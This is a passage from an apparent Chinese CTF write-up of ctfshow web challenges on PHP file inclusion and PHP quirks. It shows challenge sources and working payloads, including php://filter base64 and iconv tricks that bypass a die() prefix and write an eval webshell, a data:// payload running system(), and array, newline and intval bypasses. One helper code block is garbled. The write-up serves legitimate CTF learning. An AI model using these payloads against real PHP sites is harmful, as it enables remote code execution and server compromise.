</span></span><span class="line"><span class="ln">23</span><span class="cl">    
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><blockquote>
<p>使用 <code>file_put_contents</code> 函数将经过处理后的内容写入到文件中。写入的内容是先拼接了一个 <code>&lt;?php die('大佬别秀了');?&gt;</code> 字符串,用于在后续如果有人直接访问写入后的文件时，防止文件内容被直接执行而显示一些提示信息，然后再拼接上从 <code>$_POST</code> 中获取的 <code>$content</code> 变量的值。</p></blockquote>
<p>这道题需要用到php://filter</p>
<h5 id="phpfilter的使用">php://filter的使用<a hidden class="anchor" aria-hidden="true" href="#phpfilter的使用">#</a></h5>
<p>原文：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用 | 离别歌</a></p>
<p>php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code> 。其原因是，PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。</p>
<p>那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。</p>
<p>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：</p>
<pre tabindex="0"><code>readfile(&#34;php://filter/read=convert.base64-encode/resource=php://input&#34;);
</code></pre><p>如下：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201607/0f851469385893.png"><img alt="QQ截图20160724234603.png" loading="lazy" src="assets/thum-0f851469385893.png"></a></p>
<p>所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。</p>
<p>如下，我们使用的是<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code></p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201607/693b1469385893.png"><img alt="QQ截图20160724235335.png" loading="lazy" src="assets/thum-693b1469385893.png"></a></p>
<hr>
<p>回归正题</p>
<p>我们审一下这道题目的代码</p>
<p>相比上一道题这题增加了一个post参数，且会将传入的参数进行拼接后写入文件</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"> <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"> <span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$file</span><span class="p">),</span> <span class="s2">&#34;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&#34;</span><span class="o">.</span><span class="nv">$content</span><span class="p">);</span>
</span></span></code></pre></div><p>这道题在<code>$content</code>和<code>$file</code>之间拼接了一个<?php die('大佬别秀了');?>，导致即使我们成功写入一句话，也执行不了</p>
<p>我们如何绕过这个die呢？</p>
<p>其实我们可以通过php://filter流的base64-decode方法来去除这个die</p>
<p>因为php在解码base64编码的时候会先将不属于base64中的字符去除，再进行转换，如下</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;txt&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;|[^a-z0-9A-Z+/]|s&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;txt&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;txt&#39;</span><span class="p">]);</span>
</span></span></code></pre></div><p>所以，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、、(、) 、&lsquo;空格等字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpdie”和我们传入的其他字符。</p>
<p><code>”phpdie“</code>一共6个字符，由于base64算法解码时是4个byte一组，所以给他增加2个“a”一共8个字符。这样，&ldquo;phpdie&quot;被正常解码，而后面我们传入的webshell的base64内容也被正常解码。</p>
<p>同时由于会对传入的file进行url解码，所以需要对传入的file进行两次url编码</p>
<blockquote>
<p>warning!!!url编码需要连同英文字符一起进行转换，可以借助hackbar强制进行转换（找了很久）</p></blockquote>
<p>poc:</p>
<pre tabindex="0"><code>原文：file=php://filter/write=convert.base64-decode/resource=shell.php

file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30
</code></pre><pre tabindex="0"><code>原文：content=&lt;?php system(&#39;cat fl0g.php&#39;);?&gt;

content=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs/Pg==
</code></pre><p>访问shell.php,得到flag</p>
<p>其实还可以通过其他编码来进行绕过如rot13</p>
<p>更多<a href="https://xz.aliyun.com/t/8163?time__1311=n4%2BxnD0Dc7GQ0%3DDCDgADlhjm57IKvq0Ivo%2BimK%3Dx#toc-3">file_put_content和死亡·杂糅代码之缘 - 先知社区</a></p>
<h4 id="web88">web88<a hidden class="anchor" aria-hidden="true" href="#web88">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-17 02:27:25
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/php|\~|\!|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题过滤了很多字符但是没有过滤:、/、;</p>
<p>poc</p>
<pre tabindex="0"><code>?file=data://text/plain;base64,PD89c3lzdGVtKCJ0YWMgZmwwZy5waHAiKTsgPz4
</code></pre><h4 id="web116">web116<a hidden class="anchor" aria-hidden="true" href="#web116">#</a></h4>
<p>拿到题目环境，发现是个视频，下载视频用binwalk扫一下</p>
<p><img alt="image-20250107142748584" loading="lazy" src="./assets/image-20250107142748584.png"></p>
<p>提取图片，发现是源码</p>
<p><img alt="image-20250107142550734" loading="lazy" src="./assets/image-20250107142550734.png"></p>
<p>直接get传参读flag</p>
<pre tabindex="0"><code>?file=flag.php
</code></pre><p><img alt="image-20250107143725806" loading="lazy" src="./assets/image-20250107143725806.png"></p>
<h4 id="web117">web117<a hidden class="anchor" aria-hidden="true" href="#web117">#</a></h4>
<p>web87的后续 死亡绕过</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: yu22x
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-01 18:16:59
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$x</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#39;</span><span class="p">,</span><span class="nv">$x</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;too young too simple sometimes naive!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nv">$contents</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;contents&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="nx">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">&#34;&lt;?php die();?&gt;&#34;</span><span class="o">.</span><span class="nv">$contents</span><span class="p">);</span>
</span></span></code></pre></div><p>这题过滤了一些php的协议和转换器</p>
<p>但是没过滤掉filter和convert</p>
<p>我们可以考虑用filter搭配convert.iconv.*过滤器来构造出payload</p>
<p>参考文章：<a href="https://blog.csdn.net/woshilnp/article/details/117266628">详解php://filter以及死亡绕过_filter绕过过滤-CSDN博客</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">                                                         <span class="cp">?&gt;</span><span class="err">&#39;);
</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="err">echo $enc;
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></div><p>首先我们先将一句话木马从UCS-2BE转换成UCS-2LE</p>
<pre tabindex="0"><code>?&lt;hp pe@av(l_$EG[T]1;)&gt;?
</code></pre><p>接着构造payload将一句话木马从UCS-2LE转换回UCS-2BE，同时破坏掉<?php die();?></p>
<p>效果如下</p>
<p><img alt="image-20250108125928677" loading="lazy" src="assets/image-20250108125928677.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php
contents=?&lt;hp pe@av(l_$EG[T]1;)&gt;?
</code></pre><p>成功写入一句话木马，拿到flag</p>
<h3 id="php特性">php特性<a hidden class="anchor" aria-hidden="true" href="#php特性">#</a></h3>
<blockquote>
<p>参考网站：</p>
<p><a href="https://blog.csdn.net/qq_62046696/article/details/125272550">php一些特性函数（ctfshow）</a></p></blockquote>
<h4 id="web89">web89<a hidden class="anchor" aria-hidden="true" href="#web89">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm">\# -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm">\# @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm">\# @Date:  2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm">\# @Last Modified by:  h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm">\# @Last Modified time: 2020-09-18 15:38:51
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">\# @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">\# @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[0-9]/&#34;</span><span class="p">,</span> <span class="nv">$num</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题要用到数组绕过的特性来绕过preg_match的匹配</p>
<h5 id="preg_match函数">preg_match函数：<a hidden class="anchor" aria-hidden="true" href="#preg_match函数">#</a></h5>
<blockquote>
<p>preg_match函数是用于完成字符串的正则匹配的函数，如果找到一个匹配的，就返回1，否则就返回0。
preg_match只能处理字符串，如果传入的值是数组的话，就会报错，从而返回false，绕过了正则匹配。</p></blockquote>
<h5 id="intval函数">intval函数:<a hidden class="anchor" aria-hidden="true" href="#intval函数">#</a></h5>
<blockquote>
<ul>
<li>
<p>定义:intval()<code>函数是 PHP 中的一个内置函数。它用于获取变量的整数值。其基本语法是</code>intval($var, $base = 10)<code>。其中</code>$var<code>是要转换的变量，</code>$base<code>是可选参数，用于指定进制（当</code>$var`是字符串时），默认是十进制。</p>
</li>
<li>
<p>特性：</p>
<p>1.如果变量本身是整数，<code>intval()</code>函数会返回变量本身的值。</p>
<p>2.当变量是字符串时，<code>intval()</code>会尝试将字符串转换为整数。它会从字符串的开头提取数字部分，直到遇到非数字字符为止。</p>
<p>3.如果字符串以非数字字符开头，<code>intval()</code>会返回 0。</p>
<p>4.当第二个参数<code>$base</code>被指定时，<code>intval()</code>可以将字符串按照指定的进制转换为十进制整数。</p>
</li>
<li>
<p>注意事项</p>
<p>1.对于浮点数，<code>intval()</code>会直接截断小数部分，而不是进行四舍五入。</p>
<p>2.当处理超出整数范围的值时（在 PHP 中，根据平台和配置不同，整数范围有所不同），可能会出现意外的结果。例如，在 32 位系统上，<code>int</code>类型的最大值是<code>2147483647</code>，如果<code>intval()</code>处理的值超过这个范围，可能会导致数据丢失或者不正确的转换。</p>
</li>
</ul></blockquote>
<p>这道题直接用数组绕过</p>
<p>payload:</p>
<pre tabindex="0"><code>?num[]=1
</code></pre><h4 id="web90">web90<a hidden class="anchor" aria-hidden="true" href="#web90">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 16:06:11
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">===</span><span class="s2">&#34;4476&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">===</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">echo</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>设置<code>$base = 0</code>能提供一种根据字符串内容自动判断进制来进行转换的灵活方式。</p>
<p>这道题可以利用intval的特性和php强比较的特性</p>
<blockquote>
<p>当变量是字符串时，<code>intval()</code>会尝试将字符串转换为整数。它会从字符串的开头提取数字部分，直到遇到非数字字符为止。</p></blockquote>
<p><img alt="image-20241130160847046" loading="lazy" src="assets/image-20241130160847046.png"></p>
<h4 id="web91">web91<a hidden class="anchor" aria-hidden="true" href="#web91">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 16:16:09
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^php$/im&#39;</span><span class="p">,</span> <span class="nv">$a</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^php$/i&#39;</span><span class="p">,</span> <span class="nv">$a</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;hacker&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;nonononono&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题考察的是一个正则表达式的理解和绕过</p>
<p>这两个正则表达式都是用来匹配字符串php的</p>
<blockquote>
<h5 id="phpim-的含义"><code>/^php$/im</code> 的含义<a hidden class="anchor" aria-hidden="true" href="#phpim-的含义">#</a></h5>
<ul>
<li><code>^</code>：表示字符串的开始。</li>
<li><code>php</code>：表示匹配字符 <code>php</code>。</li>
<li><code>$</code>：表示字符串的结束。</li>
<li><code>i</code>：表示不区分大小写。</li>
<li><code>m</code>：表示多行模式（multi-line）。</li>
</ul></blockquote>
<p>要得到flag，我们需要让第一个判断为true，第二个判断为false</p>
<p>而第二个正则表达式与正则表达式一的区别在于他没有进行多行匹配</p>
<p>那我们只需要通过换行符就可以实现绕过</p>
<p>payload:</p>
<pre tabindex="0"><code>cmd=%oaphp
</code></pre><h4 id="web92">web92<a hidden class="anchor" aria-hidden="true" href="#web92">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 16:29:30
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">==</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
